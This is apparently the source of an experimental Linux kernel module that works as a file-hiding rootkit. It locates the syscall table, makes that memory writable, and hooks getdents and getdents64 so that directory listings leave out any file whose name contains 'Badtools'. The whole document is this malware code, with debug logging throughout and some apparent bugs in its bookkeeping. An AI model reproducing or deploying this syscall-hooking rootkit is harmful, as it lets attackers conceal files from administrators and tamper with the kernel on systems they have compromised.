#include <linux/module.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/mman.h>
#include <asm/proto.h>
#include <linux/slab.h>
#include "syscall.h"
#include <asm/uaccess.h>
struct linux_dirent{
	unsigned long d_ino;
	unsigned long d_off;
	 unsigned long d_reclen;
	unsigned char d_name[1];
};
asmlinkage long (*real_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
asmlinkage long (*real_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);

asmlinkage long
pew_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
	struct linux_dirent64 *d1,*d2;
	struct inode *ino;
	unsigned int returned,tmp;
	unsigned int long n;
	char hide[]="Badtools";
	
	returned = real_getdents64(fd,dirent,count);
	if(returned > 0){
		printk("Dir not empty\n");
		d1 = (struct linux_dirent64 *)kmalloc(returned,GFP_KERNEL);
	//	tmp = access_ok(VERIFY_READ, dirent, returned);
		copy_from_user(d1,dirent,returned);
		d2 = d1;
		tmp = returned;
		printk("Parsing files: Tmp %d\n",tmp);
		while(tmp > 0)
		{
			n = d2->d_reclen;
			if(n== 65535)
				goto run_away;
			tmp-=n;
			printk("Tmp: %d\n", tmp);
			if(strstr((char *) &(d2->d_name), (char *) &hide) != NULL)
			{
				printk("File found : %s\n", d2->d_name);
				if(tmp != 0)
				{
					//printk("Moving %p to %p\n", d2, ((char *)(d2 + d2->d_reclen)));
					//printk("File1: %s\n",d2->d_name);
					//printk("File2: %s\n",
			//	((struct linux_dirent64*) (((char *)d2)+d2->d_reclen) )->d_name);
					printk("Padding left <<\n");
					memmove(d2,((char *) d2) + d2->d_reclen, tmp);
				}
				else
					d2->d_off = 1024;
				printk("Dec tmp %d\n",tmp);
				tmp-=n;
				printk("Dec tmp %d\n",tmp);
			}
			if(d2->d_reclen == 0)
			{
				run_away:
				printk("Returned : %d\n", returned);
				printk("Returned : %d\n", tmp);
				returned -= tmp;
				tmp = 0;
				printk("real Returned : %d\n", returned);
			}
			if(tmp != 0)
				d2 = (struct linux_dirent64 *) ((char *) d2 + d2->d_reclen);
		printk("Looping,,\n");
		}
		printk("Copying back to user\n");
		copy_to_user(dirent, d1, returned);
		printk("finished copying back to user\n");
		kfree(d1);
		printk("Free\n");
	}
	return returned;
}

asmlinkage long
pew_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
	struct linux_dirent *d1,*d2;
	unsigned int returned,tmp;
	printk("32:\n");
	returned = real_getdents(fd,dirent,count);
	d1 = (struct linux_dirent *)kmalloc(returned,GFP_KERNEL);
	tmp = access_ok(VERIFY_READ, dirent, returned);
	if(tmp)
		printk("\tOK!\n");
	copy_from_user(d1,dirent,returned);
	if(d1 !=NULL)
		printk("\treturned\n");
	printk("\tReclen:%d\n",tmp);
	kfree(d1);
	return returned;
}
int __init
hide_init(void){

	unsigned int l;
	pte_t *pte;
	syscall_table = (void **)find_syscall_table();
	if(!syscall_table)
	{
		printk("Pew: Couldn't find syscall_table\n");
		return -1;
	}
	printk("Syscall Table: %p\n",syscall_table);
	pte = lookup_address((long unsigned int) syscall_table, &l);
	pte->pte |= _PAGE_RW;
	real_getdents = syscall_table[__NR_getdents];
	syscall_table[__NR_getdents] = pew_getdents;
	real_getdents64 = syscall_table[__NR_getdents64];
	syscall_table[__NR_getdents64] = pew_getdents64;
	return 0;
}

void __exit
hide_cleanup(void){
	unsigned int l;
	pte_t *pte;
	syscall_table[__NR_getdents] = real_getdents;
	syscall_table[__NR_getdents64] = real_getdents64;
	pte = lookup_address((unsigned int long) syscall_table, &l);
	pte->pte &=~_PAGE_RW;
	printk("Pew: Removed!\n");
	return;
}
module_init(hide_init);
module_exit(hide_cleanup);
MODULE_LICENSE("GPL");
